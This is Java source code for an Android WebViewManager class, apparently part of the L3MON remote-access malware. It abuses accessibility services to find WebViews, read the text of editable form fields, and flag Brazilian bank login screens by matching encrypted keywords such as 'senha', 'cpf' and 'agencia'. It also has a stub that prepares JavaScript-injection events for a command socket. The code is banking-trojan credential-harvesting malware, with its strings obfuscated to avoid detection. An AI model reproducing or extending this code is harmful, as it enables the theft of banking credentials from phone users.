package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import com.etechd.l3mon.StringCrypto;

public class WebViewManager {

    private static final String[] WEBVIEW_CLASS_NAMES = {
            "android.webkit.WebView",
            "com.android.webview",
            "org.chromium.content.browser"
    };

    private static final String[] LOGIN_KEYWORDS = {
            StringCrypto.d("gu3MjvrbZ7NlCWX+QXDeZQ=="), // "senha"
            StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), // "password"
            StringCrypto.d("D5RaM2GMTgBcvYb98ax+3A=="), // "pass"
            StringCrypto.d("aai9LdH0KRxjk0xdMjETsA=="), // "login"
            StringCrypto.d("BwgaiWjIQxc6tQa7iEWO3w=="), // "email"
            StringCrypto.d("hOVnOATq5/btWmhjoreTmQ=="), // "cpf"
            StringCrypto.d("n+XOJruOgAA7SqHBsUbKsA=="), // "conta"
            StringCrypto.d("uTvM5j3RGpDc6pKGSQFoTQ==") // "agencia"
    };

    /**
     * Detecta se existe WebView na tela atual
     */
    public boolean hasWebView(AccessibilityNodeInfo root) {
        if (root == null)
            return false;
        return findWebViewRecursive(root) != null;
    }

    private AccessibilityNodeInfo findWebViewRecursive(AccessibilityNodeInfo node) {
        if (node == null)
            return null;

        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        for (String webViewClass : WEBVIEW_CLASS_NAMES) {
            if (className.contains(webViewClass)) {
                return node;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findWebViewRecursive(child);
                if (result != null) {
                    child.recycle();
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }

    /**
     * Tenta capturar campos de formulário dentro de WebView
     */
    public List<JSONObject> captureWebFormFields(AccessibilityNodeInfo root) {
        List<JSONObject> fields = new ArrayList<>();
        if (root == null)
            return fields;

        captureFormFieldsRecursive(root, fields);
        return fields;
    }

    private void captureFormFieldsRecursive(AccessibilityNodeInfo node, List<JSONObject> fields) {
        if (node == null)
            return;

        if (node.isEditable()) {
            try {
                JSONObject field = new JSONObject();
                field.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), // "text"
                        node.getText() != null ? node.getText().toString() : "");
                field.put(StringCrypto.d("TOhZupsy3J8qekWoaO89cg=="), // "description"
                        node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                field.put(StringCrypto.d("BFHpcyowlm16UIaM+JbYBw=="), // "viewId"
                        node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
                field.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
                fields.add(field);
            } catch (Exception ignored) {
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                captureFormFieldsRecursive(child, fields);
                child.recycle();
            }
        }
    }

    /**
     * Detecta se parece ser uma tela de login bancário via WebView
     */
    public boolean isBankLoginWebView(AccessibilityNodeInfo root) {
        if (root == null)
            return false;

        StringBuilder allText = new StringBuilder();
        collectAllText(root, allText);
        String content = allText.toString().toLowerCase();

        int matches = 0;
        for (String keyword : LOGIN_KEYWORDS) {
            if (content.contains(keyword))
                matches++;
        }

        return matches >= 2; // Pelo menos 2 palavras-chave de login
    }

    private void collectAllText(AccessibilityNodeInfo node, StringBuilder builder) {
        if (node == null)
            return;

        if (node.getText() != null) {
            builder.append(node.getText()).append(" ");
        }
        if (node.getContentDescription() != null) {
            builder.append(node.getContentDescription()).append(" ");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectAllText(child, builder);
                child.recycle();
            }
        }
    }

    /**
     * Tenta injetar JavaScript (limitado via Accessibility)
     */
    public void attemptJSInjection(AccessibilityNodeInfo webViewNode, String jsCode) {
        try {
            JSONObject event = new JSONObject();
            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="),
                    StringCrypto.d("n6a+H5p9z5tFo8wZrJWoGOYJCe9pZy+DbB1TVJ7uX3g=")); // "action" =
                                                                                     // "webview_js_injection_attempt"
            event.put(StringCrypto.d("4e59UkvckenVsmKkcw8gZg=="), jsCode); // "jsCode"
            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            // ConnectionManager.ioSocket.emit("0xWV", event);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}